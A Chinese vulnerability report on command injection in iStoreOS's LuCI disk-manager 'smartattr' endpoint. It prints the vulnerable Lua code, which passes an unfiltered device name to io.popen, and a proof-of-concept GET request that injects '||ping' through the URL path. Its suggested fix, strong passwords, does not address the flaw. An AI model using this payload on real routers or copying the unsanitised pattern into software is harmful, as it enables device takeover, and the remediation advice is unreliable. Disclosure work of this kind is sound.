## 漏洞标题：
IstoreOS-smartattr存在命令执行

## 影响版本： 
iStoreOS R6XS v24.10.5-2025123110

## 发现时间： 
2026.01.27

## 发现人： 
Peach

## 分析报告： 

因代码中dev未做过滤导致存在命令执行漏洞。

```C
function smart_attr(dev)
  local attr = { }
  local dm = require "luci.model.diskman"
  local cmd = io.popen(dm.command.smartctl ..  " -H -A -i /dev/%s" % dev)
  if cmd then
    local content = cmd:read("*all")
    local ln
    cmd:close()
    if content:match("NVMe Version:")then
      for ln in string.gmatch(content,'[^\r\n]+') do
        if ln:match("^(.-):%s+(.+)") then
          local key, value = ln:match("^(.-):%s+(.+)")
          attr[#attr+1]= {
              key = key,
              value = value
            }
        end
      end
    else
      for ln in string.gmatch(content,'[^\r\n]+') do
        if ln:match("^.*%d+%s+.+%s+.+%s+.+%s+.+%s+.+%s+.+%s+.+%s+.+%s+.+") then
          local id,attrbute,flag,value,worst,thresh,type,updated,raw = ln:match("^%s*(%d+)%s+([%a%p]+)%s+(%w+)%s+(%d+)%s+(%d+)%s+(%d+)%s+([%a%p]+)%s+(%a+)%s+[%w%p]+%s+(.+)")
          id= "%x" % id
          if not id:match("^%w%w") then
            id = "0%s" % id
          end
          attr[#attr+1]= {
              id = id:upper(),
              attrbute = attrbute,
              flag  = flag,
              value = value,
              worst = worst,
              thresh  = thresh,
              type = type,
              updated = updated,
              raw  = raw
            }
        end
      end
    end
  end
  luci.http.prepare_content("application/json")
  luci.http.write_json(attr)
end
```

### POC
```C
GET /cgi-bin/luci/admin/system/diskman/smartattr/%7c%7cping%20www.baidu.com HTTP/1.1
Host: IP:PORT
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,en-GB;q=0.6,en-US;q=0.5
Cookie: sysauth_http=4b524da6571cdd27dac062efd9c8be9d
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0


```
## 修补方案：
使用强口令

